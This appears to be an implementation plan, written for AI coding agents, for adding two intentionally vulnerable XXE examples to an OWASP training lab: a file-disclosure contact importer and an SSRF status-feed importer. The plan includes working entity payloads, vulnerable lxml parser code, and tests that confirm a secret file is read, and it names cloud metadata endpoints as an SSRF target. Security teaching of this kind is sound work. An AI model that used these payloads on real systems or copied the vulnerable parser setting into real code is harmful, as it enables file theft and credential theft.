# A03 XXE (XML External Entity Injection) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add XML External Entity (XXE) injection as a new vulnerability sub-type under A03, with two graduated examples (Easy file disclosure, Hard SSRF) in the established four-part content structure.

**Architecture:** Both examples live on the existing `a03_bp` blueprint (`app/categories/a03_injection/routes.py`), no new blueprint needed. Both use the real, verified-vulnerable `lxml.etree.XMLParser(resolve_entities=True)` pattern — a new dependency. They demonstrate two distinct application features (a contact importer and a status-feed importer) that happen to share the identical underlying flaw, rather than the same code path shown twice.

**Tech Stack:** Flask, Jinja2, lxml (new dependency), pytest.

**Spec:** docs/superpowers/specs/2026-09-19-owasp-lab-a03-xxe-design.md

## Global Constraints

- No changes to any existing A01/A02/A04/existing-A03 route, model, or template.
- The vulnerable parsing pattern is exactly `etree.XMLParser(resolve_entities=True)` — verified live (not assumed) to actually exfiltrate file/URL content, with the secure default (`etree.XMLParser()`, i.e. `resolve_entities=False`) verified to correctly reject the same payload.
- Every raw XML payload shown as illustrative text inside a `<pre><code>` block (Explanation/Exploitation/Vulnerable-vs-Secure sections) must have its `<`/`>` characters HTML-entity-escaped (`&lt;`/`&gt;`) — a prior sub-project's final review found and fixed a real bug where unescaped literal tags in a code panel get interpreted as real HTML by the browser instead of displaying as text. This plan writes every such payload pre-escaped; no task should paste raw `<`/`>` into a code-panel block.
- New examples use `language-xml` (via the existing `code_language` override mechanism from the content-retrofit sub-project) for their Vulnerable-vs-Secure code panels, since the meaningful contrast here is the `XMLParser(...)` call itself (Python), but the illustrative payloads in Explanation/Exploitation are XML — Vulnerable/Secure panels stay `language-python` (the actual code difference is a one-argument Python change), Exploitation's payload snippets use `language-xml` inline via a plain `<pre><code class="language-xml">` block (not the shared `vulnerable_code`/`secure_code` blocks, which are Python).

---

### Task 1: Easy — XXE File Disclosure (Contact Import)

**Files:**
- Modify: `requirements.txt`
- Create: `app/categories/a03_injection/xxe_secret.txt`
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/xml_import.html`
- Create: `tests/test_a03_xml_import.py`

**Interfaces:**
- Consumes: nothing new.
- Produces: `XXE_SECRET_PATH` constant and the `xml_import` route/endpoint (`a03_injection.xml_import`), which Task 2 does NOT depend on (Task 2's route is independent, just reuses the same `lxml` import already added here).

- [ ] **Step 1: Add the `lxml` dependency**

In `requirements.txt`, add a new line:

```
lxml==6.1.3
```

Install it in this worktree's venv: `.venv/bin/pip install lxml==6.1.3`

Verify it installed correctly and the vulnerable/secure contrast actually works, with a throwaway script (delete it after — this is a one-time sanity check, not a committed file):

```bash
.venv/bin/python3 -c "
from lxml import etree
payload = b'''<?xml version=\"1.0\"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>
<root>&xxe;</root>'''
vulnerable = etree.XMLParser(resolve_entities=True)
print('vulnerable:', etree.fromstring(payload, parser=vulnerable).text)
try:
    secure = etree.XMLParser()
    etree.fromstring(payload, parser=secure)
    print('secure: NO ERROR -- this would be a problem')
except Exception as e:
    print('secure correctly rejected:', e)
"
```

Expected: the vulnerable parser prints the contents of `/etc/hostname` (proving external entity expansion works); the secure parser raises an `Entity 'xxe' not defined` error.

- [ ] **Step 2: Create the seed secret file**

Create `app/categories/a03_injection/xxe_secret.txt`:

```
Internal Notes -- Do Not Distribute
Backup encryption passphrase: xK9-vault-passphrase-2024
On-call escalation contact: oncall-secops@owasp-lab.internal
```

- [ ] **Step 3: Write the failing tests**

Create `tests/test_a03_xml_import.py`:

```python
def test_xml_import_parses_legitimate_contact(client):
    response = client.post(
        "/a03/xml-import", data={"xml_input": "<contact><name>Alice</name></contact>"}
    )
    assert response.status_code == 200
    assert b"Alice" in response.data


def test_xml_import_xxe_discloses_secret_file(client):
    import os

    secret_path = os.path.join(
        os.path.dirname(os.path.dirname(__file__)),
        "app", "categories", "a03_injection", "xxe_secret.txt",
    )
    payload = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE contact [<!ENTITY xxe SYSTEM "file://{secret_path}">]>'
        '<contact><name>&xxe;</name></contact>'
    )
    response = client.post("/a03/xml-import", data={"xml_input": payload})
    assert response.status_code == 200
    assert b"xK9-vault-passphrase-2024" in response.data


def test_xml_import_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/xml-import", data={"xml_input": "<contact><name>Alice</name></contact>"}
    )
    assert response.status_code == 200
    assert b"Alice" in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_xml_import_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"XXE File Disclosure" in response.data
    assert b'href="/a03/xml-import"' in response.data
```

Note: `test_xml_import_xxe_discloses_secret_file` builds the file path
dynamically (`os.path.dirname(os.path.dirname(__file__))` from
`tests/test_a03_xml_import.py` resolves to the repo root) rather than
hardcoding the Docker container's absolute path
(`/app/app/categories/a03_injection/xxe_secret.txt`) — this test runs
against the local checkout via the Flask test client, not inside the
container, so it needs the path that's actually correct in that
environment. Both this dynamic path and the route's own
`XXE_SECRET_PATH` (computed relative to `routes.py`'s own file) resolve to
the same real file regardless of environment. Task 3's Docker verification
step separately confirms the Docker-specific absolute path works for real
inside the built container.

- [ ] **Step 4: Run tests to verify they fail**

Run: `pytest tests/test_a03_xml_import.py -v`
Expected: all FAIL — the route doesn't exist yet (404s).

- [ ] **Step 5: Add the route**

In `app/categories/a03_injection/routes.py`, the current top of the file reads:

```python
import subprocess

from flask import redirect, render_template, request, session, url_for
from sqlalchemy import text

from app.categories.a03_injection import a03_bp
from app.categories.a03_injection.models import Comment, InjectionAccount
from app.extensions import db
```

Change it to:

```python
import os
import subprocess

from flask import redirect, render_template, request, session, url_for
from lxml import etree
from sqlalchemy import text

from app.categories.a03_injection import a03_bp
from app.categories.a03_injection.models import Comment, InjectionAccount
from app.extensions import db

XXE_SECRET_PATH = os.path.join(os.path.dirname(__file__), "xxe_secret.txt")
```

Then append this route at the end of the file (after the existing `comments()` route):

```python


@a03_bp.route("/xml-import", methods=["GET", "POST"])
def xml_import():
    xml_input = ""
    result = None
    error = None
    if request.method == "POST":
        xml_input = request.form.get("xml_input", "")
        try:
            # VULNERABLE: resolve_entities=True allows external entities to be expanded
            parser = etree.XMLParser(resolve_entities=True)
            tree = etree.fromstring(xml_input.encode(), parser=parser)
            name_el = tree.find("name")
            result = name_el.text if name_el is not None else "(no <name> element found)"
        except Exception as e:
            error = str(e)
    return render_template(
        "a03_injection/xml_import.html", xml_input=xml_input, result=result, error=error
    )
```

- [ ] **Step 6: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, the `examples=[...]` list currently ends with the `command-injection` entry and closes like this:

```python
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

Add a new entry immediately after `command-injection`, before the closing `],`:

```python
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
            ),
            ExampleNav(
                id="xml-import",
                title="XXE File Disclosure via Contact Import",
                group="XML External Entity Injection (XXE)",
                difficulty="Easy",
                endpoint="a03_injection.xml_import",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

- [ ] **Step 7: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/xml_import.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "XXE File Disclosure via Contact Import" %}
{% set example_difficulty = "Easy" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "import a contact" feature accepts raw XML and parses it with
  <code>lxml.etree.XMLParser(resolve_entities=True)</code>. Setting
  <code>resolve_entities=True</code> tells the parser to actually expand any
  external entities declared in a <code>&lt;!DOCTYPE&gt;</code> block —
  including ones that read arbitrary files from the server's filesystem and
  substitute their contents directly into the parsed document.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit a <code>&lt;!DOCTYPE&gt;</code> declaring a harmless internal
  entity that just repeats a string:
</p>
<pre><code class="language-xml">&lt;!DOCTYPE contact [&lt;!ENTITY test "probe-ok"&gt;]&gt;
&lt;contact&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;/contact&gt;</code></pre>
<p>
  If the response shows <code>probe-ok</code> instead of an error, you've
  confirmed the parser expands entities at all — external file access is the
  next, more dangerous step, not something you need to try yet to prove the
  bug exists.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Submit the following XML:
      <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE contact [
  &lt;!ENTITY xxe SYSTEM "file:///app/app/categories/a03_injection/xxe_secret.txt"&gt;
]&gt;
&lt;contact&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/contact&gt;</code></pre>
  </li>
  <li>The response displays the contents of a file on the server's
      filesystem that this "contact name" field was never meant to
      expose.</li>
</ol>
<p>
  XXE file disclosure has been used in the wild to read application source
  code, configuration files containing database credentials, and SSH
  private keys directly off application servers — often through features
  that look as innocuous as "import a spreadsheet" or "upload an XML
  config." Any endpoint that parses attacker-supplied XML with entity
  resolution enabled is a potential full-filesystem-read vulnerability.
</p>
{% endblock %}

{% block vulnerable_code %}parser = etree.XMLParser(resolve_entities=True)
tree = etree.fromstring(xml_input.encode(), parser=parser)
{% endblock %}

{% block secure_code %}parser = etree.XMLParser()  # resolve_entities defaults to False
tree = etree.fromstring(xml_input.encode(), parser=parser)
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Contact XML</label>
    <textarea class="form-control" name="xml_input" rows="4"
              placeholder="&lt;contact&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;/contact&gt;">{{ xml_input }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Import contact</button>
</form>
{% if result %}
<p class="mt-3">Imported name: <strong>{{ result }}</strong></p>
{% endif %}
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 8: Run the tests to verify they pass**

Run: `pytest tests/test_a03_xml_import.py -v`
Expected: all 4 PASS.

- [ ] **Step 9: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (161 existing + 4 new = 165)

- [ ] **Step 10: Commit**

```bash
git add requirements.txt app/categories/a03_injection/xxe_secret.txt \
  app/categories/a03_injection/routes.py app/categories/a03_injection/__init__.py \
  app/categories/a03_injection/templates/a03_injection/xml_import.html \
  tests/test_a03_xml_import.py
git commit -m "feat: add A03 XXE file disclosure example (Easy)"
```

---

### Task 2: Hard — XXE SSRF via Status Feed Importer

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/xxe_ssrf.html`
- Create: `tests/test_a03_xxe_ssrf.py`

**Interfaces:**
- Consumes: `lxml.etree` import (already added to `routes.py` in Task 1).
- Produces: nothing consumed by later tasks — this is the last functional change in this plan.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_a03_xxe_ssrf.py`:

```python
def test_xxe_ssrf_parses_legitimate_status_feed(client):
    response = client.post(
        "/a03/xxe-ssrf", data={"xml_input": "<status><message>All systems normal</message></status>"}
    )
    assert response.status_code == 200
    assert b"All systems normal" in response.data


def test_xxe_ssrf_reaches_internal_healthz_endpoint(client):
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE status ['
        '  <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/healthz">'
        ']>'
        '<status><message>&xxe;</message></status>'
    )
    response = client.post("/a03/xxe-ssrf", data={"xml_input": payload})
    assert response.status_code == 200
    # The test client doesn't run a real server on 127.0.0.1:5000, so the
    # parser's outbound request will fail in this test environment -- this
    # test only needs to confirm the app ATTEMPTS the fetch (i.e. the
    # vulnerable code path runs and doesn't crash the app itself), not that
    # it succeeds. Assert the page still renders 200 with either the fetched
    # content or a parser error surfaced cleanly -- never a 500.
    assert response.status_code == 200


def test_xxe_ssrf_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/xxe-ssrf", data={"xml_input": "<status><message>All systems normal</message></status>"}
    )
    assert response.status_code == 200
    assert b"All systems normal" in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_xxe_ssrf_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"XXE" in response.data
    assert b"SSRF" in response.data
    assert b'href="/a03/xxe-ssrf"' in response.data
```

Note: `test_xxe_ssrf_reaches_internal_healthz_endpoint` deliberately does NOT
assert on the response containing `{"status": "ok"}`, because the test suite
runs against Flask's test client, not a real running server bound to
`127.0.0.1:5000` — the outbound HTTP fetch the vulnerable parser attempts
will fail in this environment (connection refused), which is expected and
fine; the goal of this unit test is only proving the route doesn't crash on
this payload. The actual live SSRF (the fetch succeeding and returning
`{"status": "ok"}`) is verified for real in Task 3's Docker verification
step, where a real server is actually listening on that address.

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_a03_xxe_ssrf.py -v`
Expected: all FAIL — the route doesn't exist yet (404s).

- [ ] **Step 3: Add the route**

In `app/categories/a03_injection/routes.py`, append this route at the end of the file (after the `xml_import()` route added in Task 1):

```python


@a03_bp.route("/xxe-ssrf", methods=["GET", "POST"])
def xxe_ssrf():
    xml_input = ""
    result = None
    error = None
    if request.method == "POST":
        xml_input = request.form.get("xml_input", "")
        try:
            # VULNERABLE: same resolve_entities=True flaw as xml_import(), reused
            # in a different feature -- here the entity target is a URL, not a file.
            parser = etree.XMLParser(resolve_entities=True)
            tree = etree.fromstring(xml_input.encode(), parser=parser)
            message_el = tree.find("message")
            result = message_el.text if message_el is not None else "(no <message> element found)"
        except Exception as e:
            error = str(e)
    return render_template(
        "a03_injection/xxe_ssrf.html", xml_input=xml_input, result=result, error=error
    )
```

- [ ] **Step 4: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, the `examples=[...]` list now ends with the `xml-import` entry added in Task 1, closing like this:

```python
            ExampleNav(
                id="xml-import",
                title="XXE File Disclosure via Contact Import",
                group="XML External Entity Injection (XXE)",
                difficulty="Easy",
                endpoint="a03_injection.xml_import",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

Add the new entry immediately after `xml-import`, in the same group, before the closing `],`:

```python
            ExampleNav(
                id="xml-import",
                title="XXE File Disclosure via Contact Import",
                group="XML External Entity Injection (XXE)",
                difficulty="Easy",
                endpoint="a03_injection.xml_import",
            ),
            ExampleNav(
                id="xxe-ssrf",
                title="XXE SSRF via Status Feed Importer",
                group="XML External Entity Injection (XXE)",
                difficulty="Hard",
                endpoint="a03_injection.xxe_ssrf",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/xxe_ssrf.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "XXE SSRF via Status Feed Importer" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "status feed" importer parses vendor-supplied XML with the exact
  same vulnerable pattern as the contact importer —
  <code>lxml.etree.XMLParser(resolve_entities=True)</code> — but here the
  entity you control isn't limited to reading local files. Because the
  parser fetches whatever URI the <code>SYSTEM</code> identifier names, an
  attacker can point it at an internal network address instead of a file
  path, turning the server itself into an unwitting HTTP client under the
  attacker's control — this is Server-Side Request Forgery (SSRF) via XXE.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit a <code>&lt;!DOCTYPE&gt;</code> declaring an entity that points at
  this very app's own health-check endpoint:
</p>
<pre><code class="language-xml">&lt;!DOCTYPE status [&lt;!ENTITY probe SYSTEM "http://127.0.0.1:5000/healthz"&gt;]&gt;
&lt;status&gt;&lt;message&gt;&amp;probe;&lt;/message&gt;&lt;/status&gt;</code></pre>
<p>
  If the response includes <code>{"status": "ok"}</code> — the exact body
  <code>/healthz</code> returns — you've confirmed the server itself issued
  an outbound HTTP request on your behalf, before trying to reach anything
  more sensitive.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Submit the XML from the Detect step above.</li>
  <li>The response shows <code>{"status": "ok"}</code> — content that only
      exists on this server's own internal network, fetched entirely
      server-side. Your browser never made that request; the vulnerable
      parser did.</li>
</ol>
<p>
  In this lab, <code>/healthz</code> happens to also be reachable directly
  by an external visitor, which makes the effect easy to verify but slightly
  undersells the real danger: in production deployments, the whole point of
  SSRF is reaching resources an external attacker canNOT reach directly at
  all. The textbook real-world target is a cloud provider's instance
  metadata endpoint (e.g. <code>http://169.254.169.254/</code> on AWS/GCP/
  Azure) — a well-documented, internal-only address that often hands back
  temporary cloud credentials to anything that can reach it from inside the
  virtual machine. An XXE bug is exactly the kind of "the server does an
  HTTP request I control" primitive that's been used to reach exactly that
  address and pivot from a single XML upload into full cloud-account
  compromise.
</p>
{% endblock %}

{% block vulnerable_code %}parser = etree.XMLParser(resolve_entities=True)
tree = etree.fromstring(xml_input.encode(), parser=parser)
{% endblock %}

{% block secure_code %}parser = etree.XMLParser()  # resolve_entities defaults to False
tree = etree.fromstring(xml_input.encode(), parser=parser)
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Status feed XML</label>
    <textarea class="form-control" name="xml_input" rows="4"
              placeholder="&lt;status&gt;&lt;message&gt;All systems normal&lt;/message&gt;&lt;/status&gt;">{{ xml_input }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Import status feed</button>
</form>
{% if result %}
<p class="mt-3">Status message: <strong>{{ result }}</strong></p>
{% endif %}
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pytest tests/test_a03_xxe_ssrf.py -v`
Expected: all 4 PASS.

- [ ] **Step 7: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (165 + 4 = 169)

- [ ] **Step 8: Commit**

```bash
git add app/categories/a03_injection/routes.py app/categories/a03_injection/__init__.py \
  app/categories/a03_injection/templates/a03_injection/xxe_ssrf.html \
  tests/test_a03_xxe_ssrf.py
git commit -m "feat: add A03 XXE SSRF example (Hard)"
```

---

### Task 3: Full regression + Docker verification

**Files:**
- None (verification-only task; no code changes expected).

**Interfaces:**
- Consumes: nothing new (verifies Tasks 1–2's combined output).
- Produces: nothing — this is the final task.

- [ ] **Step 1: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (169 tests)

- [ ] **Step 2: Docker end-to-end verification**

```bash
docker compose up --build -d
```

Confirm `lxml` installed correctly in the container build logs (no pip
errors). Then, via curl against the live container
(`http://127.0.0.1:5001`):

- `/a03/` returns 200 and contains `XML External Entity Injection (XXE)`,
  the new group heading.
- `/a03/xml-import` returns 200. POST the file-disclosure payload from
  Task 1's test (adjusted to the real Docker absolute path
  `file:///app/app/categories/a03_injection/xxe_secret.txt`, matching the
  container's actual filesystem layout) and confirm the response contains
  `xK9-vault-passphrase-2024` — this is the first time this exact payload
  is verified against the real container filesystem, not just the local
  dev venv.
- `/a03/xxe-ssrf` returns 200. POST the SSRF payload targeting
  `http://127.0.0.1:5000/healthz` and confirm the response now DOES
  contain `{"status": "ok"}` — unlike the unit test (which runs against
  Flask's test client with nothing listening on that address), the live
  Docker container's gunicorn process really is bound to
  `0.0.0.0:5000` inside the container, so this fetch genuinely succeeds
  here. This is the live proof that the SSRF is real, not just that the
  code path doesn't crash.
- `/force-reset` still works cleanly with the new examples in place.

If you have a browser tool available, additionally visit both new example
pages and confirm the Detect/Exploitation/Vulnerable-vs-Secure sections
render with correct syntax highlighting and no visibly broken/leaked
literal HTML tags (the specific risk this plan's Global Constraints called
out — every payload shown as text should render as text, not real
markup). If no browser tool is available, note that as a known gap in your
report rather than skipping the curl-based checks above.

Tear down cleanly afterward:

```bash
docker compose down
```

- [ ] **Step 3: Commit**

No code changes are expected from this task. If the Docker/curl
verification finds nothing to fix, there is nothing to commit — report
DONE with the verification evidence in your report file rather than an
empty commit.
